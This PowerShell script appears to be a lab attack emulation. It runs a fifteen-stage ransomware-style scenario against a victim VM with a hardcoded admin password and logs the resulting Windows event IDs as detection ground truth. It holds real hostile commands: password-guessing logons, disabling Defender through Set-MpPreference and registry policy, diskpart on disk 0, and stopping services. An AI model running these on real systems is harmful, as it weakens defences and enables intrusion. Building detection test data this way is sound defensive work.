param(
    [string]$ScenarioPath = ".\scenario4.json",
    [string]$VictimIP     = "192.168.25.130",
    [string]$VictimUser   = "Administrator",
    [string]$VictimPass   = "plave230312!"
)

# ==============================
# Admin Check
# ==============================
$principal = New-Object Security.Principal.WindowsPrincipal `
    ([Security.Principal.WindowsIdentity]::GetCurrent())

if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Run PowerShell as Administrator." -ForegroundColor Red
    exit
}

# ==============================
# Load Scenario JSON
# ==============================
if (-not (Test-Path $ScenarioPath)) {
    Write-Error "Scenario file not found: $ScenarioPath"
    exit
}

$Scenario  = [System.IO.File]::ReadAllText(
    (Resolve-Path $ScenarioPath),
    [System.Text.Encoding]::UTF8
) | ConvertFrom-Json
$Artifacts = $Scenario.artifacts_definition

$BaseDir    = $Artifacts.base_directory
$TargetDir  = $Artifacts.target_file_dir
$RansomExe  = $Artifacts.ransomware_exe
$MbrScript  = $Artifacts.mbr_script
$RansomNote = $Artifacts.ransom_note
$EncExt     = $Artifacts.encrypted_ext

# ==============================
# Credential Setup
# ==============================
$SecurePass = ConvertTo-SecureString $VictimPass -AsPlainText -Force
$Cred       = New-Object PSCredential($VictimUser, $SecurePass)

# ==============================
# GT Structure
# ==============================
$GTDir  = "C:\GT"
$GTPath = "$GTDir\ground_truth_scenario4.json"

if (-not (Test-Path $GTDir)) { New-Item $GTDir -ItemType Directory -Force | Out-Null }

$Global:GT = @{
    schema_version = "2.0"
    scenario_name  = $Scenario.scenario_name
    scenario_id    = $Scenario.scenario_id
    attacker       = $env:COMPUTERNAME
    victim         = $VictimIP
    user           = $VictimUser
    generated_at   = (Get-Date).ToString("o")
    records        = @()
}

$AllowedSecurityIDs = @($Scenario.environment_context.required_logging_configuration.security_events | ForEach-Object { [int]$_ })
$AllowedSysmonIDs   = @($Scenario.environment_context.required_logging_configuration.sysmon_events   | ForEach-Object { [int]$_ })

$Global:StageSummary = [System.Collections.ArrayList]::new()

function Add-ToList {
    param([System.Collections.ArrayList]$List, $Items)
    if ($Items) {
        $Items | ForEach-Object { [void]$List.Add([int]$_) }
    }
}

# ==============================
# Event Collector
# ==============================
function Collect-ObservedEvents {
    param($Start, $End)
    $securityIds = [System.Collections.ArrayList]::new()
    $sysmonIds   = [System.Collections.ArrayList]::new()

    try {
        $sec = Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
            param($s, $e, $ids)
            Get-WinEvent -FilterHashtable @{
                LogName   = 'Security'
                StartTime = $s
                EndTime   = $e
            } -ErrorAction SilentlyContinue |
                Where-Object { [int]$_.Id -in $ids } |
                Select-Object -ExpandProperty Id -Unique
        } -ArgumentList $Start, $End, $AllowedSecurityIDs -ErrorAction SilentlyContinue
        Add-ToList $securityIds $sec
    } catch {}

    try {
        $sys = Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
            param($s, $e, $ids)
            Get-WinEvent -FilterHashtable @{
                LogName   = 'Microsoft-Windows-Sysmon/Operational'
                StartTime = $s
                EndTime   = $e
            } -ErrorAction SilentlyContinue |
                Where-Object { [int]$_.Id -in $ids } |
                Select-Object -ExpandProperty Id -Unique
        } -ArgumentList $Start, $End, $AllowedSysmonIDs -ErrorAction SilentlyContinue
        Add-ToList $sysmonIds $sys
    } catch {}

    return [ordered]@{
        sysmon   = $sysmonIds
        security = $securityIds
    }
}

# ==============================
# Stage Executor
# ==============================
function Invoke-Stage {
    param(
        $StageId,
        $StageName,
        $ActionType,
        $ArtifactPaths,
        [ScriptBlock]$Action,
        [bool]$Attack,
        $PrimarySignal = ""
    )

    Write-Host "===== Stage $StageId : $StageName =====" -ForegroundColor Cyan

    $stageMeta          = $Scenario.scenario_flow | Where-Object { $_.stage_id -eq $StageId }
    $resolvedActionType = if ($stageMeta -and $stageMeta.action_type) { $stageMeta.action_type } else { $ActionType }

    $status = "success"
    $start  = Get-Date

    try { & $Action } catch {
        $status = "failed"
        Write-Host "  [FAILED] Stage $StageId - $_" -ForegroundColor Red
    }

    Start-Sleep -Seconds 8
    $end = Get-Date

    $events    = Collect-ObservedEvents $start $end.AddSeconds(60)
    $stageMeta = $Scenario.scenario_flow | Where-Object { $_.stage_id -eq $StageId }

    if ($stageMeta -and $stageMeta.expected_logs) {
        $expectedSec = @()
        $expectedSys = @()
        if ($stageMeta.expected_logs.security) { $expectedSec = @($stageMeta.expected_logs.security | ForEach-Object { [int]$_ }) }
        if ($stageMeta.expected_logs.sysmon)   { $expectedSys = @($stageMeta.expected_logs.sysmon   | ForEach-Object { [int]$_ }) }

        $fSec = [System.Collections.ArrayList]::new()
        Add-ToList $fSec ($events.security | Where-Object { [int]$_ -in $expectedSec } | Sort-Object -Unique)
        $events.security = $fSec

        $fSys = [System.Collections.ArrayList]::new()
        Add-ToList $fSys ($events.sysmon | Where-Object { [int]$_ -in $expectedSys } | Sort-Object -Unique)
        $events.sysmon = $fSys
    }

    $Global:GT.records += [ordered]@{
        stage_id           = $StageId
        stage_name         = $StageName
        action_type        = $resolvedActionType
        description        = if ($stageMeta) { $stageMeta.description } else { "" }
        attack             = $Attack
        stage_start_time   = $start.ToString("o")
        stage_end_time     = $end.ToString("o")
        artifact_paths     = $ArtifactPaths
        attacker           = $env:COMPUTERNAME
        victim             = $VictimIP
        execution_status   = $status
        observed_event_ids = $events
        expected_event_ids = if ($stageMeta) { $stageMeta.expected_logs } else { $null }
        primary_log_signal = $PrimarySignal
        notes              = if ($stageMeta) { $stageMeta.notes } else { "" }
    }

    [void]$Global:StageSummary.Add([PSCustomObject]@{
        ID     = $StageId
        Name   = $StageName
        Status = $status
    })

    Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 7)
}

# ==============================
# Summary Printer
# ==============================
function Show-Summary {
    Write-Host ""
    Write-Host "============================================" -ForegroundColor White
    Write-Host "  STAGE SUMMARY" -ForegroundColor White
    Write-Host "============================================" -ForegroundColor White
    foreach ($s in $Global:StageSummary) {
        $icon = switch ($s.Status) {
            "success" { "[OK    ]" }
            "partial" { "[PART  ]" }
            "failed"  { "[FAILED]" }
            default   { "[?     ]" }
        }
        $color = switch ($s.Status) {
            "success" { "Green"  }
            "partial" { "Yellow" }
            "failed"  { "Red"    }
            default   { "Gray"   }
        }
        Write-Host ("  {0} Stage {1,2} : {2}" -f $icon, $s.ID, $s.Name) -ForegroundColor $color
    }
    $total   = $Global:StageSummary.Count
    $ok      = ($Global:StageSummary | Where-Object Status -eq "success").Count
    $partial = ($Global:StageSummary | Where-Object Status -eq "partial").Count
    $failed  = ($Global:StageSummary | Where-Object Status -eq "failed").Count
    Write-Host "--------------------------------------------" -ForegroundColor White
    Write-Host ("  Total:{0}  OK:{1}  Partial:{2}  Failed:{3}" -f $total, $ok, $partial, $failed) -ForegroundColor White
    Write-Host "============================================" -ForegroundColor White
}

# ==============================
# Victim VM Pre-Setup
# ==============================
Write-Host "[Setup] Preparing victim VM..." -ForegroundColor Yellow

Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
    param($BaseDir, $TargetDir, $RansomExe)

    @($BaseDir, $TargetDir) | ForEach-Object {
        if (-not (Test-Path $_)) { New-Item $_ -ItemType Directory -Force | Out-Null }
    }

    1..5 | ForEach-Object {
        $p = "$TargetDir\testfile$_.txt"
        if (-not (Test-Path $p)) { Set-Content $p "dummy content $_" }
    }

    if (-not (Test-Path $RansomExe)) {
        Copy-Item "$env:windir\System32\notepad.exe" $RansomExe -Force
    }

    auditpol /set /subcategory:"{0CCE922B-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
    auditpol /set /subcategory:"{0CCE9215-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
    auditpol /set /subcategory:"{0CCE9216-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
    auditpol /set /subcategory:"{0CCE921D-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
    auditpol /set /subcategory:"{0CCE921E-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
    auditpol /set /subcategory:"{0CCE9223-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null

    try {
        $audit = New-Object System.Security.AccessControl.FileSystemAuditRule(
            "Everyone", "FullControl",
            "ContainerInherit,ObjectInherit", "None", "Success,Failure"
        )
        foreach ($dir in @($BaseDir, $TargetDir, "C:\Users\Public")) {
            if (Test-Path $dir) {
                $acl = Get-Acl $dir
                $acl.AddAuditRule($audit)
                Set-Acl $dir $acl
            }
        }
    } catch {}

    # 이벤트 로그 파일 SACL 설정
    $evtxPath = "C:\Windows\System32\winevt\Logs"
    try {
        $acl = Get-Acl $evtxPath
        $audit = New-Object System.Security.AccessControl.FileSystemAuditRule(
            "Everyone", "FullControl",
            "ContainerInherit,ObjectInherit", "None", "Success,Failure"
        )
        $acl.AddAuditRule($audit)
        Set-Acl $evtxPath $acl
    } catch {}

    try {
        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
        $regAcl   = Get-Acl $regPath
        $regAudit = New-Object System.Security.AccessControl.RegistryAuditRule(
            "Everyone", "SetValue,Delete",
            "ContainerInherit,ObjectInherit", "None", "Success,Failure"
        )
        $regAcl.AddAuditRule($regAudit)
        Set-Acl $regPath $regAcl
    } catch {}

    Write-Host "[Setup] Victim VM ready." -ForegroundColor Green

} -ArgumentList $BaseDir, $TargetDir, $RansomExe

Start-Sleep -Seconds 3
Write-Host "[Setup] Done." -ForegroundColor Green

# ===================================================
# STAGE FLOW
# ===================================================

Invoke-Stage 1 "rdp_bruteforce_initial_access" "network_connection" `
    "EID 4625 repeat, EID 4624, Sysmon 3" {

    $wrongPasswords = @("Password1", "Admin123", "Welcome1", "Test1234", "Summer2024")
    foreach ($pw in $wrongPasswords) {
        net use "\\$VictimIP\IPC$" /user:$VictimUser $pw 2>$null | Out-Null
        net use "\\$VictimIP\IPC$" /delete 2>$null | Out-Null
        Start-Sleep -Milliseconds 800
    }
    net use "\\$VictimIP\IPC$" /user:$VictimUser $VictimPass 2>$null | Out-Null
    Start-Sleep -Seconds 2
    net use "\\$VictimIP\IPC$" /delete 2>$null | Out-Null

} $true "EID 4625 repeat + EID 4624 + Sysmon 3"


Invoke-Stage 2 "privileged_session_established" "session_token" `
    "EID 4672 (Special Privileges Assigned)" {

    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
        whoami /priv | Out-Null
    }

} $true "EID 4672 (Special Privileges Assigned)"


Invoke-Stage 3 "privilege_enumeration" "process_start" `
    "powershell.exe spawn, whoami /groups artifact" {

    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
        Start-Process powershell -ArgumentList `
            "-NoProfile -WindowStyle Hidden -Command `"whoami /groups; Get-LocalGroupMember Administrators`"" `
            -WindowStyle Hidden -Wait
    }

} $true "Process Create: powershell.exe (whoami /groups) -> EID 4688 + Sysmon 1"


Invoke-Stage 4 "initial_cleanup_attempt" "process_start" `
    "Security.evtx handle acquisition attempt" {
    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {

        $target = "C:\Windows\System32\winevt\Logs\Security.evtx"
        Write-Host "  [Stage 4] Attempting Security.evtx access..." `
            -ForegroundColor Gray

        try {
            $fs = [System.IO.File]::Open(
                $target,
                [System.IO.FileMode]::Open,
                [System.IO.FileAccess]::ReadWrite,
                [System.IO.FileShare]::None
            )
            Write-Host "  [UNEXPECTED] Handle acquired" `
                -ForegroundColor Red
            $fs.Close()
        } catch {
            Write-Host "  [Expected Fail] Handle acquisition failed." `
                -ForegroundColor Yellow
        }
    }
} $true `
"EID 4688 + EID 4656: Security.evtx handle acquisition attempt"


Invoke-Stage 5 "defender_disable_attempt_fail" "command_execution" `
    "Set-MpPreference fail (Tamper Protection assumed active)" {

    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
        } catch {
            Write-Host "  [Expected Fail] Set-MpPreference failed." -ForegroundColor Yellow
        }
    }

} $true "Set-MpPreference fail"


Invoke-Stage 6 "defender_disable_retry" "command_execution" `
    "Set-MpPreference retry success" {

    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
        # Set-MpPreference 시도
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true `
                -DisableBehaviorMonitoring $true `
                -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        } catch {}

        # 레지스트리 직접 수정 → EID 4663 발생
        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath `
            -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $regPath `
            -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
    }

} $true "Set-MpPreference retry -> EID 4663 registry write"




Invoke-Stage 7 "payload_transfer" "network_connection" `
    "ransomware.exe created (download simulation)" {

    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
        param($RansomExe)
        $fakeDomain = "payload-c2-$(Get-Random -Max 9999).cdn-svc.net"
        Resolve-DnsName -Name $fakeDomain -ErrorAction SilentlyContinue | Out-Null
        Start-Process -FilePath "nslookup" `
            -ArgumentList "$fakeDomain 127.0.0.1" `
            -WindowStyle Hidden -Wait
        Copy-Item "$env:windir\System32\notepad.exe" $RansomExe -Force
    } -ArgumentList $RansomExe

} $true "Sysmon 3 + Sysmon 11 (ransomware.exe created) + EID 4663"


Invoke-Stage 8 "payload_execution_fail" "process_start" `
    "ransomware.exe execution fail (wrong path)" {

    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
        param($BaseDir)
        try {
            Start-Process -FilePath "$BaseDir\ransomware_wrong.exe" `
                -WindowStyle Hidden -ErrorAction Stop
        } catch {
            Write-Host "  [Expected Fail] Execution failed (wrong path)." -ForegroundColor Yellow
        }
    } -ArgumentList $BaseDir

} $true "Process Create fail -> EID 4688 + EID 4656"


Invoke-Stage 9 "payload_execution_success" "process_start" `
    "ransomware.exe execution success" {

    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
        param($RansomExe)
        $proc = Start-Process -FilePath $RansomExe -WindowStyle Hidden -PassThru
        Start-Sleep -Seconds 3
        if ($proc -and -not $proc.HasExited) { $proc.Kill() }
    } -ArgumentList $RansomExe

} $true "Process Create: ransomware.exe -> EID 4688 + Sysmon 1"


Invoke-Stage 10 "file_encryption_partial" "file_create" `
    "encrypted .locked files created" {

    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
        param($TargetDir)
        Get-ChildItem "$TargetDir\*.txt" | ForEach-Object {
            $content = Get-Content $_.FullName -Raw
            $encPath = $_.FullName -replace '\.txt$', '.locked'
            $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($content))
            Set-Content -Path $encPath -Value $encoded -Force
            Get-Content $_.FullName | Out-Null
        }
    } -ArgumentList $TargetDir

} $true "EID 4663 multiple + Sysmon 11 (.locked files)"


Invoke-Stage 11 "mbr_modification_attempt_fail" "process_start" `
    "diskpart.exe spawn, PhysicalDrive0 access denied" {

    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
        param($MbrScript)
        Set-Content -Path $MbrScript -Value "select disk 0`nexit" -Force
        Start-Process -FilePath "diskpart.exe" `
            -ArgumentList "/s `"$MbrScript`"" `
            -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
    } -ArgumentList $MbrScript

} $true "Process Create: diskpart.exe -> EID 4656 AccessDenied"


Invoke-Stage 12 "ransom_note_creation" "file_create" `
    "README_DECRYPT.txt created" {

    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
        param($RansomNote)
        $guid = [guid]::NewGuid().ToString()
        $noteContent = "YOUR FILES HAVE BEEN ENCRYPTED`n================================`n[SIMULATION - NOT REAL RANSOMWARE]`n`nContact: sim-attacker@example.com`nPayment ID: $guid`n`nDO NOT delete this file."
        Set-Content -Path $RansomNote -Value $noteContent -Force
    } -ArgumentList $RansomNote

} $true "Sysmon 11 (README_DECRYPT.txt) + EID 4663"


Invoke-Stage 13 "service_disruption" "process_start" `
    "sc.exe stop Spooler" {

    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
        Start-Process -FilePath "sc.exe" `
            -ArgumentList "stop Spooler" `
            -WindowStyle Hidden -Wait
    }

} $true "Process Create: sc.exe -> EID 4688 + Sysmon 1"


Invoke-Stage 14 "final_cleanup_partial" "file_delete" `
    "ransomware.exe and mbr_script.txt deleted" {

    Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
        param($RansomExe, $MbrScript)
        if (Test-Path $RansomExe) { Remove-Item $RansomExe -Force -ErrorAction SilentlyContinue }
        if (Test-Path $MbrScript) { Remove-Item $MbrScript -Force -ErrorAction SilentlyContinue }
    } -ArgumentList $RansomExe, $MbrScript

} $true "Sysmon 26 (ransomware.exe deleted) + EID 4663"


Invoke-Stage 15 "session_termination" "process_exit" `
    $null {

    Write-Host "  [Stage 15] Session terminating (waiting for EID 4634/4647)..." -ForegroundColor Gray
    Start-Sleep -Seconds 3

} $false "EID 4647 (user logoff) + EID 4634 (LogonId session release)"


# ==============================
# Cleanup
# ==============================
Write-Host "[Cleanup] Cleaning up victim VM..." -ForegroundColor Yellow

Invoke-Command -ComputerName $VictimIP -Credential $Cred -ScriptBlock {
    param($TargetDir)
    Start-Service Spooler -ErrorAction SilentlyContinue
    #sGet-ChildItem "$TargetDir\*.locked" | Remove-Item -Force -ErrorAction SilentlyContinue
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false `
            -DisableBehaviorMonitoring $false `
            -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
    } catch {}
} -ArgumentList $TargetDir

net use "\\$VictimIP\IPC$" /delete 2>$null | Out-Null
Write-Host "[Cleanup] Done." -ForegroundColor Green

# ==============================
# Show Summary
# ==============================
Show-Summary

# ==============================
# Save GT
# ==============================
$Global:GT.total_stages = $Global:GT.records.Count
$Global:GT | ConvertTo-Json -Depth 6 | Out-File $GTPath -Encoding UTF8
Write-Host "GT saved to $GTPath" -ForegroundColor Yellow
